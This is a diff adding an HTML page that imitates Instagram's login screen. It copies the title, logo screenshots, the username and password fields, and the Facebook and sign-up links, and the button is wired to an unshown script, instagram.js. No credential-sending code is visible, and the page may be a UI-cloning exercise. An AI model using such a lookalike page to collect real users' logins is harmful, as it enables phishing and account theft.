@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <link rel="icon" href="download.jpeg">
+    <meta charset="UTF-8" />
+    <title>Instagram</title>
+
+    <style>
+
+      body {
+        margin: 0;
+        background-color: #f9f9f9;
+        font-family: Arial, sans-serif;
+      }
+
+      .page {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        margin-top: 100px;
+      }
+
+      .card {
+        background-color: white;
+        height: 520px;
+        width: 350px;
+        border: 1px solid #dbdbdb;
+        text-align: center;
+      }
+
+      .lower_card {
+        margin-top: 10px;
+        background-color: white;
+        height: 30px;
+        width: 350px;
+        border: 1px solid #dbdbdb;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 14px;
+      }
+
+      .lower_card a {
+        color: #0095f6;
+        text-decoration: none;
+        margin-left: 5px;
+        font-weight: 600;
+      }
+
+      input {
+        width: 280px;
+        height: 40px;
+        margin-top: 10px;
+        padding-left: 8px;
+        border: 1px solid #dbdbdb;
+        background-color: #fafafa;
+        font-size: 14px;
+      }
+
+      button {
+        width: 290px;
+        height: 40px;
+        margin-top: 12px;
+        background-color: #0f93f3;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 15px;
+        cursor: pointer;
+      }
+
+      .divider {
+        margin: 30px 0;
+        display: flex;
+        align-items: center;
+        width: 300px;
+        margin-left: 20px;
+      }
+
+      .divider hr {
+        flex: 1;
+        opacity: 0.4;
+      }
+
+      .divider span {
+        margin: 0 10px;
+        color: gray;
+        font-size: 13px;
+      }
+
+      a {
+        text-decoration: none;
+        color: #385185;
+        font-size: 14px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <h1 id="h1"></h1>
+    <div class="page">
+      <!-- Main Card -->
+      <div class="card">
+        <img
+          src="Screenshot 2026-02-01 at 4.10.46 PM.png"
+          alt="Instagram"
+          width="212"
+          style="margin-top: 32px"
+        />
+
+        <!-- FORM -->
+        <form id="loginForm" action="#" method="post" style="margin-top: 48px">
+  <input id="username" type="text" placeholder="Email, username or phone" required />
+  <input id="password" type="password" placeholder="Password" required />
+  <button id="submit" type="button">Log in</button>
+</form>
+
+        <div class="divider">
+          <hr />
+          <span>OR</span>
+          <hr />
+        </div>
+
+        <p style="margin-top: 80px">
+          <a href="#">Log in with Facebook</a>
+        </p>
+
+        <p>
+          <a href="#">Forgot password?</a>
+        </p>
+      </div>
+
+      <!-- Lower Card -->
+      <div class="lower_card">
+        <span>Don’t have an account?</span>
+        <a href="#">Sign up</a>
+      </div>
+      <div class="below_lower_card">
+        <img
+          src="Screenshot 2026-02-01 at 5.51.55 PM.png"
+          alt=""
+          style="width: 280px; margin-top: 20px"
+        />
+      </div>
+      <div class="end_card">
+        <img
+          src="Screenshot 2026-02-01 at 5.27.22 PM.png"
+          alt=""
+          style="width: 800px; height: 200px"
+        />
+      </div>
+    </div>
+    
+    <script src="instagram.js"></script>
+  </body>
+</html>
